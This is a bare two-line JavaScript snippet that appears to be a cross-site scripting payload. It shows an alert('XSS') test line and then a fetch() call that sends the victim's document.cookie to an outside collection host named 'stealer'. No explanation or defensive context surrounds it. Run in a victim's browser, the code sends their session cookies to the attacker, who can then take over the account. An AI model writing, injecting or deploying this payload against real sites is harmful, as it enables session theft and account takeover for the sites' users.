alert('XSS');
fetch('https://stealer.free.beeceptor.com?cookie=' + document.cookie);
